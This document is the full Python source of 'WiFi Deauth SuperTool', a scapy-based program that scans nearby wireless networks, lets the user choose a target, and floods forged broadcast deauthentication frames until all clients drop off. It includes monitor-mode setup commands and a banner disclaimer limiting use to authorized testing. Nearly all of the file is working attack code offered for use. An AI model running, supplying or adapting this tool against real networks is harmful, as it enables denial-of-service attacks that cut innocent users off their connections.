#!/usr/bin/env python3
"""
WiFi Deauth SuperTool - Unified WiFi Deauthentication Attack Framework
Author: Ruby Doss (@rubydoss)
Instagram: @mr__dawxz

A professional, all-in-one tool for WiFi penetration testing that guides users
through network scanning and deauthentication attacks.

FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!
"""

import os
import signal
import sys
import time
from collections import defaultdict
from datetime import datetime
from threading import Thread

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()
except ImportError as e:
    print(f"❌ Missing dependencies: {e}")
    print("Please install requirements: pip3 install -r requirements.txt")
    sys.exit(1)

# Global variables
monitor_interface = None
scanning = False
attacking = False
attack_stats = {
    'packets_sent': 0,
    'start_time': None,
    'target_bssid': None,
    'target_ssid': None
}

def print_banner():
    """Display tool banner with author information"""
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
║                    WiFi Deauth SuperTool                        ║
║              Unified WiFi Penetration Framework                  ║
╠══════════════════════════════════════════════════════════════════╣
║  Author: Ruby Doss (@rubydoss)                                  ║
║  Instagram: @mr__dawxz                                           ║
║  GitHub: https://github.com/rubydoss                            ║
╠══════════════════════════════════════════════════════════════════╣
║  ⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️           ║
╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}[!] Legal Notice: Only use on networks you own or have explicit permission to test.
[!] Unauthorized WiFi attacks are illegal and punishable by law.{Style.RESET_ALL}
"""
    print(banner)

def print_status(message, status_type="INFO"):
    """Print colored status messages"""
    colors = {
        "INFO": Fore.BLUE,
        "SUCCESS": Fore.GREEN, 
        "WARNING": Fore.YELLOW,
        "ERROR": Fore.RED
    }
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{colors.get(status_type, Fore.WHITE)}[{timestamp}] [{status_type}]{Style.RESET_ALL} {message}")

def check_root():
    """Check if running with root privileges"""
    if os.geteuid() != 0:
        print_status("This tool requires root privileges to access wireless interfaces", "ERROR")
        print_status("Please run with: sudo python3 wifi_deauth_supertool.py", "INFO")
        sys.exit(1)

def signal_handler(signum, frame):
    """Handle Ctrl+C gracefully"""
    global attacking, scanning
    print_status("\\nShutdown signal received...", "WARNING")
    attacking = False
    scanning = False
    print_status("Goodbye! 👋", "INFO")
    sys.exit(0)

def show_monitor_mode_instructions():
    """Show instructions for manually setting up monitor mode"""
    instructions = f"""
{Fore.CYAN}📋 MONITOR MODE SETUP INSTRUCTIONS:{Style.RESET_ALL}

Please manually set up monitor mode before using this tool:

{Fore.YELLOW}Step 1: Check your wireless interfaces{Style.RESET_ALL}
iwconfig

{Fore.YELLOW}Step 2: Stop interfering processes{Style.RESET_ALL}
sudo systemctl stop NetworkManager
sudo airmon-ng check kill

{Fore.YELLOW}Step 3: Enable monitor mode{Style.RESET_ALL}
sudo airmon-ng start wlan0
{Fore.GREEN}(Replace 'wlan0' with your interface name){Style.RESET_ALL}

{Fore.YELLOW}Step 4: Verify monitor mode is enabled{Style.RESET_ALL}
iwconfig
{Fore.GREEN}(Look for 'Mode:Monitor' - interface name usually becomes wlan0mon){Style.RESET_ALL}

{Fore.YELLOW}Step 5: Run this tool again and enter your monitor interface name{Style.RESET_ALL}

{Fore.RED}⚠️  Common monitor interface names: wlan0mon, wlan1mon, etc.{Style.RESET_ALL}
"""
    print(instructions)

def get_monitor_interface():
    """Get monitor interface from user input"""
    global monitor_interface
    
    print(f"\\n{Fore.CYAN}📡 Monitor Mode Interface Setup{Style.RESET_ALL}")
    print("=" * 50)
    
    while True:
        try:
            interface = input(f"{Fore.YELLOW}Enter your monitor mode interface (e.g., wlan0mon): {Style.RESET_ALL}").strip()
            
            if not interface:
                print_status("Please enter a valid interface name!", "ERROR")
                continue
            
            # Check if interface exists and is in monitor mode
            try:
                import subprocess
                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
                
                if 'No such device' in result.stderr:
                    print_status(f"Interface '{interface}' not found!", "ERROR")
                    print_status("Please check your interface name with: iwconfig", "INFO")
                    continue
                
                if 'Mode:Monitor' not in result.stdout:
                    print_status(f"Interface '{interface}' is not in monitor mode!", "ERROR")
                    print_status("Please enable monitor mode first", "INFO")
                    show_monitor_mode_instructions()
                    continue
                
                monitor_interface = interface
                print_status(f"Monitor interface verified: {interface}", "SUCCESS")
                return interface
                
            except Exception as e:
                print_status(f"Error checking interface: {e}", "ERROR")
                continue
                
        except KeyboardInterrupt:
            print_status("\\nExiting...", "INFO")
            sys.exit(0)

class NetworkScanner:
    """WiFi network scanner class"""
    
    def __init__(self, interface):
        self.interface = interface
        self.networks = {}
        self.clients = defaultdict(list)
        self.scanning = False
    
    def packet_handler(self, packet):
        """Handle captured packets during scanning"""
        if not self.scanning:
            return
        
        try:
            if packet.haslayer(Dot11Beacon):
                self.process_beacon(packet)
        except Exception:
            pass
    
    def process_beacon(self, packet):
        """Process beacon frames to extract network info"""
        try:
            bssid = packet[Dot11].addr3
            
            # Extract SSID
            ssid = ""
            if packet.haslayer(Dot11Elt):
                ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
            
            if not ssid:
                ssid = "<Hidden>"
            
            # Get channel
            channel = self.get_channel(packet)
            
            # Get encryption
            crypto = self.get_crypto_type(packet)
            
            # Get signal strength
            signal_strength = "N/A"
            if packet.haslayer(RadioTap) and hasattr(packet[RadioTap], 'dBm_AntSignal'):
                signal_strength = f"{packet[RadioTap].dBm_AntSignal} dBm"
            
            # Store network info
            if bssid not in self.networks:
                self.networks[bssid] = {
                    'ssid': ssid,
                    'bssid': bssid,
                    'channel': channel,
                    'crypto': crypto,
                    'signal': signal_strength,
                    'beacons': 1
                }
            else:
                self.networks[bssid]['beacons'] += 1
                
        except Exception:
            pass
    
    def get_channel(self, packet):
        """Extract channel from beacon"""
        try:
            p = packet[Dot11Elt]
            while isinstance(p, Dot11Elt):
                if p.ID == 3:  # DS Parameter Set
                    return ord(p.info[:1])
                p = p.payload
            return "?"
        except:
            return "?"
    
    def get_crypto_type(self, packet):
        """Determine encryption type"""
        try:
            crypto = []
            
            # Check privacy bit
            if packet[Dot11].FCfield & 0x40:
                crypto.append("WEP")
            
            # Parse information elements
            p = packet[Dot11Elt]
            while isinstance(p, Dot11Elt):
                if p.ID == 48:  # RSN IE (WPA2/WPA3)
                    crypto.append("WPA2")
                elif p.ID == 221 and len(p.info) >= 4 and p.info[:4] == b'\\x00P\\xf2\\x01':
                    crypto.append("WPA")
                p = p.payload
            
            if not crypto:
                return "Open"
            return "/".join(crypto)
            
        except:
            return "Unknown"
    
    def scan_networks(self, duration=20):
        """Scan for networks for specified duration"""
        print_status(f"Scanning for WiFi networks on {self.interface}...", "INFO")
        print_status(f"Scanning for {duration} seconds - Please wait...", "INFO")
        
        self.scanning = True
        
        # Start packet capture in separate thread
        capture_thread = Thread(target=self._capture_packets, daemon=True)
        capture_thread.start()
        
        # Scan for specified duration with progress
        for i in range(duration):
            time.sleep(1)
            print(f"\\r{Fore.YELLOW}[SCANNING] {i+1}/{duration}s - Networks found: {len(self.networks)}{Style.RESET_ALL}", end="")
        
        print()  # New line
        self.scanning = False
        
        print_status(f"Scan complete! Found {len(self.networks)} networks", "SUCCESS")
        return self.networks
    
    def _capture_packets(self):
        """Capture packets in separate thread"""
        try:
            sniff(iface=self.interface, prn=self.packet_handler, 
                  stop_filter=lambda x: not self.scanning, timeout=1)
        except Exception as e:
            print_status(f"Capture error: {e}", "ERROR")

def display_networks(networks):
    """Display discovered networks in a nice table"""
    if not networks:
        print_status("No networks found!", "WARNING")
        return None
    
    print(f"\\n{Fore.CYAN}📡 Discovered WiFi Networks:{Style.RESET_ALL}")
    print("=" * 80)
    print(f"{'#':<3} {'SSID':<25} {'BSSID':<18} {'Ch':<4} {'Security':<12} {'Signal':<10}")
    print("=" * 80)
    
    network_list = list(networks.values())
    
    for i, network in enumerate(network_list, 1):
        ssid = network['ssid'][:24] if len(network['ssid']) > 24 else network['ssid']
        color = Fore.GREEN if network['crypto'] == "Open" else Fore.YELLOW
        
        print(f"{color}{i:<3} {ssid:<25} {network['bssid']:<18} {network['channel']:<4} "
              f"{network['crypto']:<12} {network['signal']:<10}{Style.RESET_ALL}")
    
    return network_list

def select_target_network(networks):
    """Let user select target network"""
    network_list = display_networks(networks)
    
    if not network_list:
        return None
    
    while True:
        try:
            choice = input(f"\\n{Fore.YELLOW}Select target network (1-{len(network_list)}) or 'q' to quit: {Style.RESET_ALL}")
            
            if choice.lower() == 'q':
                return None
            
            choice = int(choice) - 1
            
            if 0 <= choice < len(network_list):
                target = network_list[choice]
                print_status(f"Selected target: {target['ssid']} ({target['bssid']})", "INFO")
                return target
            else:
                print_status("Invalid choice! Please try again.", "ERROR")
                
        except ValueError:
            print_status("Please enter a valid number or 'q' to quit!", "ERROR")
        except KeyboardInterrupt:
            print_status("\\nExiting...", "INFO")
            sys.exit(0)

def confirm_attack(target):
    """Get user confirmation for attack"""
    print(f"\\n{Fore.RED}⚠️  WARNING: You are about to attack WiFi network:{Style.RESET_ALL}")
    print(f"   SSID: {Fore.CYAN}{target['ssid']}{Style.RESET_ALL}")
    print(f"   BSSID: {Fore.CYAN}{target['bssid']}{Style.RESET_ALL}")
    print(f"   Security: {Fore.CYAN}{target['crypto']}{Style.RESET_ALL}")
    
    print(f"\\n{Fore.YELLOW}This will disconnect all clients from this network!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Only proceed if you have explicit permission to test this network.{Style.RESET_ALL}")
    
    while True:
        try:
            confirm = input(f"\\n{Fore.RED}Continue with deauth attack? [y/N]: {Style.RESET_ALL}").lower()
            
            if confirm in ['y', 'yes']:
                return True
            elif confirm in ['n', 'no', '']:
                return False
            else:
                print_status("Please enter 'y' for yes or 'n' for no", "ERROR")
                
        except KeyboardInterrupt:
            print_status("\\nExiting...", "INFO")
            sys.exit(0)

def perform_deauth_attack(interface, target):
    """Perform continuous deauthentication attack"""
    global attacking, attack_stats
    
    attack_stats['start_time'] = time.time()
    attack_stats['target_bssid'] = target['bssid']
    attack_stats['target_ssid'] = target['ssid']
    attack_stats['packets_sent'] = 0
    attacking = True
    
    print_status(f"Starting deauthentication attack on {target['ssid']}", "INFO")
    print_status("Press Ctrl+C to stop the attack", "WARNING")
    
    try:
        while attacking:
            # Create deauth packet (broadcast to all clients)
            packet = RadioTap() / Dot11(
                type=0, subtype=12,
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                addr2=target['bssid'],       # AP
                addr3=target['bssid']        # BSSID
            ) / Dot11Deauth(reason=7)
            
            # Send packet
            sendp(packet, iface=interface, verbose=False)
            attack_stats['packets_sent'] += 1
            
            # Display stats every 10 packets
            if attack_stats['packets_sent'] % 10 == 0:
                duration = time.time() - attack_stats['start_time']
                rate = attack_stats['packets_sent'] / duration if duration > 0 else 0
                
                print(f"\\r{Fore.GREEN}[ATTACKING] Packets: {attack_stats['packets_sent']} | "
                      f"Rate: {rate:.1f}/sec | Duration: {int(duration)}s{Style.RESET_ALL}", end="")
            
            time.sleep(0.1)  # 100ms delay between packets
            
    except KeyboardInterrupt:
        attacking = False
        print(f"\\n{Fore.YELLOW}Attack stopped by user{Style.RESET_ALL}")
    except Exception as e:
        attacking = False
        print_status(f"\\nAttack error: {e}", "ERROR")
    
    # Print final stats
    duration = time.time() - attack_stats['start_time']
    print(f"\\n\\n{Fore.CYAN}📊 Attack Summary:{Style.RESET_ALL}")
    print(f"   Target: {attack_stats['target_ssid']} ({attack_stats['target_bssid']})")
    print(f"   Packets sent: {attack_stats['packets_sent']}")
    print(f"   Duration: {int(duration)} seconds")
    print(f"   Average rate: {attack_stats['packets_sent']/duration:.1f} packets/sec")

def main_menu():
    """Main application loop"""
    global monitor_interface
    
    print_banner()
    
    # Check root privileges
    check_root()
    
    # Setup signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Get monitor interface from user
    print_status("Setting up monitor mode interface...", "INFO")
    monitor_interface = get_monitor_interface()
    
    if not monitor_interface:
        print_status("No valid monitor interface provided. Exiting.", "ERROR")
        return
    
    try:
        while True:
            print(f"\\n{Fore.CYAN}🚀 WiFi Deauth SuperTool - Main Menu{Style.RESET_ALL}")
            print("=" * 45)
            print(f"Monitor Interface: {Fore.GREEN}{monitor_interface}{Style.RESET_ALL}")
            print("=" * 45)
            print(f"  {Fore.GREEN}[1]{Style.RESET_ALL} Scan Networks & Launch Attack")
            print(f"  {Fore.GREEN}[2]{Style.RESET_ALL} Change Monitor Interface") 
            print(f"  {Fore.GREEN}[3]{Style.RESET_ALL} Show Monitor Mode Instructions")
            print(f"  {Fore.GREEN}[4]{Style.RESET_ALL} Exit")
            
            choice = input(f"\\n{Fore.YELLOW}Choose option (1-4): {Style.RESET_ALL}")
            
            if choice == "1":
                # Scan networks and attack
                scanner = NetworkScanner(monitor_interface)
                networks = scanner.scan_networks(20)
                
                if networks:
                    target = select_target_network(networks)
                    if target and confirm_attack(target):
                        perform_deauth_attack(monitor_interface, target)
                else:
                    print_status("No networks found. Try scanning again or check your interface.", "WARNING")
            
            elif choice == "2":
                # Change monitor interface
                monitor_interface = get_monitor_interface()
            
            elif choice == "3":
                # Show instructions
                show_monitor_mode_instructions()
            
            elif choice == "4":
                print_status("Goodbye! 👋", "INFO")
                sys.exit(0)
            
            else:
                print_status("Invalid choice! Please select 1, 2, 3, or 4.", "ERROR")
                
    except KeyboardInterrupt:
        print_status("\\nExiting...", "INFO")
        sys.exit(0)
    except Exception as e:
        print_status(f"Unexpected error: {e}", "ERROR")
        sys.exit(1)

if __name__ == "__main__":
    main_menu()
